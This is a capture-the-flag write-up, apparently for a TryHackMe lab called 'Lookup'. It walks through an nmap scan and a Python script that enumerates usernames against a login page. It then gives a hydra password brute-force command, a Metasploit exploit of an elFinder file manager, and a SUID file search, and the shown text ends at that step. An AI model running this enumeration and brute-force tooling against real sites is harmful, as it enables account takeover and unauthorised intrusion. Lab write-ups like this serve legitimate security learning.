<img width="1204" height="172" alt="Header-page" src="https://github.com/user-attachments/assets/7f8c92b1-9c15-4197-8ad7-fd496b3ace5c" />  

### First scanned the ip by `nmap -sC -sV -A <target-ip>` , and got 2 open ports 
```python
Nmap scan report for 10.49.173.4
Host is up (0.096s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 56:91:67:99:22:9e:fe:ec:20:8e:30:04:cc:fa:ac:64 (RSA)
|   256 5f:6a:89:52:2c:86:d8:d3:1a:0b:d9:a4:8b:66:03:96 (ECDSA)
|_  256 68:61:04:c0:22:63:ec:0a:b5:7b:32:55:96:1d:a8:ad (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/4%OT=22%CT=1%CU=35828%PV=Y%DS=3%DC=T%G=Y%TM=6AC1FFD
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=105%GCD=1%ISR=103%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FA%GCD=1%ISR=103%TI=Z%C
OS:I=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=
OS:1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8N
OS:NT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W3
OS:=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=Y
OS:%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   112.15 ms 192.168.128.1
2   ...
3   112.28 ms 10.49.173.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.68 seconds
```

### The http port open with domain name `lookup.thm` so let's save the thm ip and the domain name in `/etc/hosts` .
### Opened the domain name in Firefox , saw a normal login page with username and password credentials . Tried to enter some random username and password but its wrong , so tried to brute-force the username password using hydra.

<img width="1920" height="739" alt="admin-username" src="https://github.com/user-attachments/assets/7e92ebd5-1668-4116-be28-8af596b3a74b" />  

### But got many passwords which actually don't work 
### I thought of using a username extracting script which will give us correct usernames . 
```python
import requests

# Define the target URL
url = "http://lookup.thm/login.php"

# Define the file path containing usernames
username_file = "/usr/share/seclists/Usernames/Names/names.txt"  # Replace with your wordlist path

# Fixed password for testing
password = "password"

# Custom headers (optional)
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
}

# Function to send POST requests and process responses
def check_username(username):
    # Prepare the POST data
    data = {
        "username": username,
        "password": password
    }

    try:
        # Send the POST request
        response = requests.post(url, data=data, headers=headers)

        # Check the response content
        if "Wrong password" in response.text:
            print(f"Username found: {username}")
        elif "wrong username" in response.text:
            pass  # Silent continuation for wrong usernames
        else:
            print(f"[?] Unexpected response for username: {username}")
    except requests.RequestException as e:
        print(f"[!] Request failed for username {username}: {e}")

# Main function
if __name__ == "__main__":
    try:
        # Open the username file and read each line
        with open(username_file, "r") as file:
            for line in file:
                username = line.strip()
                if not username:
                    continue  # Skip empty lines

                check_username(username)
    except FileNotFoundError:
        print(f"[!] Wordlist file '{username_file}' not found!")
    except requests.RequestException as e:
        print(f"[!] An HTTP request error occurred: {e}")
```
### This will take around 20 minutes to retrieve usernames , therefore finally it will get two usernames `admin` and `jose` .
### Now as I know the correct username now let's get the password using hydra , use below command 
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username="USER"&password="PASS":wrong"
```
### This gave me a correct password , and tried login in to the site with the password and username as jose and got `server not found message` which actually redirected to a doamin name `files.lookup.thm` . So added this name in /etc/hosts and reloaded and got a page which looks like a file manager .
<img width="1920" height="922" alt="files" src="https://github.com/user-attachments/assets/8862d6fc-27c7-467d-997f-4f65941b17a7" />

### In the credentials.txt i saw a username `think` with no password written . But after woking on it more found nothing interesting , then found the file manager version which is exploitable .

<img width="512" height="233" alt="elfinder-version" src="https://github.com/user-attachments/assets/bc115f57-4671-4ca5-9b69-5fcf6eff6324" />
<img width="1920" height="245" alt="searchsploit" src="https://github.com/user-attachments/assets/8a018308-7551-40da-b2d3-52210c154669" />

### The version matches but we are going to use for 2.1.48 version , its easy to exploit through metasploit .
<img width="1920" height="845" alt="msf" src="https://github.com/user-attachments/assets/c7247f15-63b5-4de3-8ebe-f1cb4d650a47" />

### And finally got a meterpreter session , and got a shell . Then found the user.txt file but said permission denied , this means we need to login through other username . Then by searching for suid permission files by `find / -perm /4000 2>/dev/null` and got a interesting file `/usr/sbin/pwn` .
<img width="1920" height="839" alt="suid" src="https://github.com/user-attachments/assets/c11ae4b2-84b4-483a-811a-328cf0af688c" />









